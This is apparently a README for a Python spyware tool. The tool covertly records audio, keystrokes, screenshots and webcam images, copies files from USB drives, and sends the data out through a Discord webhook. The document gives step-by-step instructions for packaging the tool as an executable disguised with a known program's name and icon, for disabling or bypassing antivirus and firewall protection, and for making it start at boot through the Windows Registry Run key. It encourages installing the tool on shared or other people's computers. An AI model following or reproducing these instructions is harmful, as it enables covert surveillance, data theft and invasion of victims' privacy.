# Python spyware with Discord Webhooks v1
## Python spyware with Discord Webhooks.


The script records audio, captures keystrokes, takes screenshots and camera images, detects connected USB drives to copy targeted files, and sends all these data to Discord via a webhook.
You need to install the file, putting it in .exe format, using a name and icon from a known program or on the target computer. 
You can use these commands in sequence in cmd.exe; 
‘cd “your folder name” (with the .py and the .ico) -> “pip install pyinstaller” -> “pyinstaller --onefile --noconsole --icon=icon.ico ”file.py’.
After that, search in the main file, there will be new sub-files created and the .exe will be in them.

To install the .exe on a computer :
That depends on the anti-virus present, either it is necessary to create an exception or to deactivate it then to create an exception, for Windows defender it is enough to authorize has to carry out it without asking it has each starting (it is enough for you to restart your computer to have this pop up).  
You need to create an exception in ‘Windows Defender Firewall with Advanced Security’, exit and enter, then go to ‘Registry Editor’, enter this in the path: ‘HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run’, right click in the empty space, -> ‘New’ > ‘String Value’, enter the name of your software, right click on the name, then ‘modify’ and in ‘Value data:’ enter the path to your .exe file.
        
You now have the key to having a little spyware on a computer, which can be interesting on free access computers, shared computers or someone's computer.
You can of course use your own methods to hide or install the executable.
